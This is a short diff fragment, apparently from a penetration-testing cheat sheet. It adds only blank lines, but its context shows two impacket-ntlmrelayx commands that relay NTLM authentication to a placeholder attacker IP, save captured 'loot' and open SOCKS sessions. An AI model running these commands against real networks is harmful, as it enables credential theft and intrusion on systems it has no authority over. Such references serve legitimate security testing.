@@ -17,3 +17,5 @@ updated_at: '2023-04-10T20:25:58.237494+00:00'
 impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
 impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug
 ```
+
+
